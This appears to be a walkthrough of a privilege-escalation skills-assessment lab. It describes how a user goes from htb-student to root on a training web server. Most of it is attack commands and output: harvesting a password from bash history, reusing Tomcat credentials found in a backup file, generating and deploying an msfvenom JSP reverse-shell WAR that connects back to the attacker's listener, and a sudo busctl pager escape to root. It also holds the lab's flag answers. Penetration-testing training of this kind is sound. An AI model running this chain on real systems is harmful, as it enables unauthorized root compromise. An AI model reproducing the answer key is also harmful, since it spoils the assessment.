## ID
535

## Module
Linux Privilege Escalation

## Kind
lab

## Title
Skills Assessment — Linux Local Privilege Escalation

## Description
Multi-flag skills assessment requiring full privilege escalation chain from `htb-student` to `root` on an INLANEFREIGHT web server, combining hidden file discovery, credential harvesting, group-based access, Tomcat WAR deployment, and sudo GTFOBins abuse.

## Tags
skills-assessment, privilege-escalation, tomcat, sudo, gtfobins, credential-hunting

## Commands
- `ls -lA`
- `cat /home/barry/.bash_history`
- `su barry`
- `id`
- `netstat -tulpn | grep LISTEN`
- `cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"`
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<PWNBOX_IP> LPORT=<PORT> -f war -o managerUpdated.war`
- `nc -nvlp <PORT>`
- `sudo -l`
- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `sudo busctl --show-machine`
- `!/bin/bash`

## What This Section Covers
A full privilege escalation chain across four different user contexts (htb-student → barry → tomcat → root), testing enumeration of hidden files, credential harvesting from bash history, group-based file access (adm), service exploitation via Tomcat WAR file upload, and sudo misconfiguration abuse via GTFOBins. This mirrors a realistic engagement where you chain multiple low-severity findings into full root compromise.

## Methodology

### Phase 1 — Initial Enumeration as htb-student (Flags 1 & 2)

1. SSH in: `ssh htb-student@<TARGET_IP>` with password `Academy_LLPE!`.
2. Enumerate the home directory with `ls -lA` — the `-A` flag is critical because it reveals hidden files and directories that plain `ls` will miss.
3. Notice the `.config/` directory owned by root. List its contents: `ls -lA .config/` → reveals `.flag1.txt`.
4. Read flag1: `cat .config/.flag1.txt`.
5. Enumerate other users' home directories. Read barry's bash history: `cat /home/barry/.bash_history`.
6. Spot the leaked password in the sshpass command: `sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local`.
7. Pivot to barry: `su barry` → enter password `i_l0ve_s3cur1ty!`.
8. Read flag2: `cat /home/barry/flag2.txt`.

### Phase 2 — Lateral Movement as barry (Flag 3)

9. Check group memberships: `id` → notice `groups=1001(barry),4(adm)`.
10. The `adm` group grants read access to `/var/log/` and other system log directories.
11. Read flag3: `cat /var/log/flag3.txt`.

### Phase 3 — Service Exploitation: Tomcat WAR Shell (Flag 4)

This is where it gets interesting. You need to discover an internal service, find its credentials, and exploit it for code execution as a different user.

**Step 1 — Discover the service:**

12. Enumerate listening ports from the target: `netstat -tulpn | grep LISTEN`.
13. Key findings from the output:
    - Port 22 — SSH (already using this)
    - Port 80 — HTTP (web server)
    - Port 3306 — MySQL
    - Port 8080 — **Tomcat** (this is the target)
    - Port 33060 — MySQL X Protocol
14. Confirm by visiting `http://<TARGET_IP>:8080/` in a browser — you'll see the default Apache Tomcat landing page.

**Step 2 — Find Tomcat credentials:**

15. Tomcat credentials are stored in `tomcat-users.xml`. Search for config files:
    ```
    find /etc/tomcat9/ -type f 2>/dev/null
    ```
16. You'll find `/etc/tomcat9/tomcat-users.xml.bak` — a backup file the admin left behind. The active `tomcat-users.xml` may be unreadable, but the `.bak` is world-readable.
17. Extract the credentials:
    ```
    cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"
    ```
18. Result: `username="tomcatadm"` / `password="T0mc@t_s3cret_p@ss!"` with roles `manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script`.
19. The `manager-gui` role is the critical one — it grants access to the Tomcat Manager Application where you can deploy WAR files.

**Step 3 — Access Tomcat Manager:**

20. Navigate to `http://<TARGET_IP>:8080/manager/html` in your browser.
21. When prompted for credentials, enter `tomcatadm:T0mc@t_s3cret_p@ss!`.
22. You now have access to the Application Manager dashboard. Scroll down to the "WAR file to deploy" section — this is your attack vector.

**Step 4 — Generate the malicious WAR file:**

23. On your Pwnbox (attack machine), generate a JSP reverse shell packaged as a WAR file using msfvenom:
    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_PWNBOX_IP> LPORT=9001 -f war -o managerUpdated.war
    ```
    - `-p java/jsp_shell_reverse_tcp` — Java-based reverse shell payload (Tomcat runs Java)
    - `LHOST` — your Pwnbox IP (check with `ip a` or use the HTB VPN IP, typically on `tun0`)
    - `LPORT` — the port your listener will catch the shell on (pick any unused port, e.g., 9001)
    - `-f war` — output format is a WAR (Web Application Archive) file
    - `-o managerUpdated.war` — output filename (name it something that blends in with legitimate deployments)

**Step 5 — Set up the listener:**

24. On your Pwnbox, start a netcat listener on the port you chose:
    ```
    nc -nvlp 9001
    ```
    - `-n` — no DNS resolution
    - `-v` — verbose
    - `-l` — listen mode
    - `-p 9001` — port to listen on

**Step 6 — Deploy and trigger:**

25. In the Tomcat Manager web interface, use the "WAR file to deploy" section:
    - Click "Browse" → select `managerUpdated.war`
    - Click "Deploy"
26. The WAR file is now deployed as a web application. You'll see it listed under "Applications" as `/managerUpdated`.
27. **Click on `/managerUpdated`** in the applications list — this sends an HTTP request to the deployed JSP, which triggers the reverse shell payload.
28. Check your netcat listener — you should see:
    ```
    Ncat: Connection from <TARGET_IP>.
    Ncat: Connection from <TARGET_IP>:<PORT>.
    ```
29. Verify your shell: type `whoami` → `tomcat`. You now have code execution as the `tomcat` service account.
30. Read flag4: `cat /var/lib/tomcat9/flag4.txt`.

### Phase 4 — Privilege Escalation to Root: sudo + GTFOBins (Flag 5)

This is the most critical phase. You have a shell as `tomcat` but it's a dumb shell (no TTY), and you need to escalate to root via a sudo misconfiguration.

**Step 1 — Upgrade your shell:**

31. The reverse shell from msfvenom gives you a raw/dumb terminal — no tab completion, no job control, no ability to use interactive programs like `sudo`, `su`, `vi`, or anything that invokes a pager. You MUST upgrade to a PTY first.
32. Spawn a PTY using Python:
    ```
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    ```
    This gives you a proper bash prompt: `tomcat@nix03:/var/lib/tomcat9$`
33. (Optional but recommended) For a fully interactive shell, you can also do:
    ```
    # In your reverse shell after spawning PTY:
    export TERM=xterm
    # Then press Ctrl+Z to background the shell
    # In your local terminal:
    stty raw -echo; fg
    # Press Enter twice — you now have full interactivity
    ```

**Step 2 — Enumerate sudo privileges:**

34. Check what the tomcat user can run with sudo:
    ```
    sudo -l
    ```
35. Output:
    ```
    User tomcat may run the following commands on nix03:
        (root) NOPASSWD: /usr/bin/busctl
    ```
36. Key details to notice:
    - `(root)` — the command runs as root
    - `NOPASSWD` — no password required (critical since you don't know tomcat's password)
    - `/usr/bin/busctl` — the specific binary allowed

**Step 3 — Research the binary on GTFOBins:**

37. GTFOBins (https://gtfobins.github.io/) is the go-to reference for exploiting Unix binaries that can be abused for privilege escalation. Search for `busctl`.
38. The GTFOBins entry for `busctl` shows that when run with `--show-machine`, it invokes a **pager** (like `less`) to display output. Pagers allow you to execute shell commands by typing `!<command>`.
39. The exploit is:
    ```
    sudo busctl --show-machine
    !/bin/bash
    ```

**Step 4 — Execute the exploit:**

40. Run busctl as root via sudo:
    ```
    sudo busctl --show-machine
    ```
41. This opens the output in a pager. You'll see a "WARNING: terminal is not fully functional" message — this is expected and harmless. Press RETURN/Enter to continue.
42. Now you're inside the pager. Type the pager escape command:
    ```
    !/bin/bash
    ```
43. The display may look garbled (`!//bbiinn//bbaasshh`) — this is because the terminal is echoing characters twice due to the non-fully-functional terminal. **Ignore the garbled display and press Enter.** The command executes correctly regardless of how it looks.
44. You now have a root shell:
    ```
    root@nix03:/var/lib/tomcat9#
    ```
45. Verify: `id` → `uid=0(root) gid=0(root) groups=0(root)`
46. Read flag5: `cat /root/flag5.txt`.

**Why this works — the pager escape explained:**

- Many Linux commands display long output through a pager program (usually `less`). When a program invokes a pager, it inherits the program's privileges.
- Since `sudo busctl --show-machine` runs as root, the pager also runs as root.
- The `less` pager supports the `!command` syntax to execute arbitrary shell commands. When you type `!/bin/bash`, the pager spawns a bash shell — and because the pager is running as root, that bash shell is also root.
- This is the same principle behind GTFOBins entries for `man`, `less`, `more`, `journalctl`, `systemctl`, `git log`, and many other commands that invoke pagers.
- The general rule: **if you can sudo a binary that uses a pager, you can get a root shell.**

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: flag1.txt | LLPE{d0n_ov3rl00k_h1dden_f1les!} | `ls -lA` → `.config/` → `cat .config/.flag1.txt` |
| Q2: flag2.txt | LLPE{ch3ck_th0se_cmd_l1nes!} | `cat /home/barry/.bash_history` → password `i_l0ve_s3cur1ty!` → `su barry` → `cat /home/barry/flag2.txt` |
| Q3: flag3.txt | LLPE{h3y_l00k_a_fl@g!} | barry is in `adm` group → `cat /var/log/flag3.txt` |
| Q4: flag4.txt | LLPE{im_th3_m@nag3r_n0w} | See Phase 3 — netstat finds Tomcat on :8080 → creds from `/etc/tomcat9/tomcat-users.xml.bak` (`tomcatadm:T0mc@t_s3cret_p@ss!`) → login to Manager at `:8080/manager/html` → generate WAR with `msfvenom -p java/jsp_shell_reverse_tcp` → deploy via Manager → click deployed app to trigger → catch reverse shell as `tomcat` → `cat /var/lib/tomcat9/flag4.txt` |
| Q5: flag5.txt | LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!} | See Phase 4 — upgrade to PTY → `sudo -l` shows `(root) NOPASSWD: /usr/bin/busctl` → GTFOBins pager escape: `sudo busctl --show-machine` then `!/bin/bash` in the pager → root shell → `cat /root/flag5.txt` |

## Key Takeaways
- Always enumerate hidden files (`ls -lA`) in home directories — `.config`, `.ssh`, `.local` are prime targets that basic `ls` won't show.
- Bash history is one of the most common credential leaks — check every user's `.bash_history` for passwords, SSH commands, and database connections.
- Group memberships (especially `adm`, `docker`, `lxd`, `disk`) grant access to sensitive files even without sudo — always check `id` after pivoting to a new user.
- Look for backup config files (`.bak`, `.old`, `.save`, `~`) — admins frequently leave credential-containing backups with looser permissions than the originals.
- Tomcat Manager with valid credentials is a guaranteed shell via WAR deployment — this is a bread-and-butter web service exploit that appears constantly on exams and real engagements.
- The msfvenom WAR payload formula is worth memorizing: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war`.
- **Always upgrade dumb shells to PTY before attempting sudo or any interactive command.** Without a TTY, sudo, su, and pager-based commands will fail or behave unpredictably.
- GTFOBins is essential for sudo privesc — any binary that invokes a pager (`less`, `more`, `man`, `busctl`, `journalctl`, `systemctl`, `git`) can be escaped with `!/bin/bash`.
- The general pager escape rule: if you can `sudo` a binary and it displays output through a pager, type `!/bin/bash` (or `!/bin/sh`) inside the pager to get a root shell.
- The full chain (hidden files → bash history → group access → service exploitation → sudo abuse) represents the layered approach needed for real-world assessments — no single technique gave root.

## Gotchas
- **Dumb shell kills Q5**: The WAR reverse shell gives you a dumb terminal with NO TTY. If you skip the PTY upgrade and run `sudo busctl --show-machine`, it will either fail outright or the pager won't work. Always `python3 -c 'import pty;pty.spawn("/bin/bash")'` first.
- **Garbled pager output**: When you type `!/bin/bash` in the busctl pager, the display shows `!//bbiinn//bbaasshh` — this is cosmetic (double echo from the non-functional terminal warning). The command works. Don't retype or panic.
- **Tomcat creds are in .bak, not the live file**: `tomcat-users.xml` may be unreadable, but `tomcat-users.xml.bak` is world-readable. Always search for backup files: `find / -name "*.bak" -o -name "*.old" -o -name "*.save" 2>/dev/null`.
- **Wrong listener IP**: The msfvenom `LHOST` must be your Pwnbox/VPN IP (`tun0`), not `eth0` or localhost. Double-check with `ip a show tun0`.
- **Flag1 is double-hidden**: It's a dotfile (`.flag1.txt`) inside a dotdirectory (`.config`) — `ls` alone shows nothing; `ls -lA` is required.
- **Must click the deployed WAR app**: Simply deploying the WAR file doesn't trigger the reverse shell. You must click the application name (`/managerUpdated`) in the Manager's application list to send the HTTP request that executes the JSP payload.
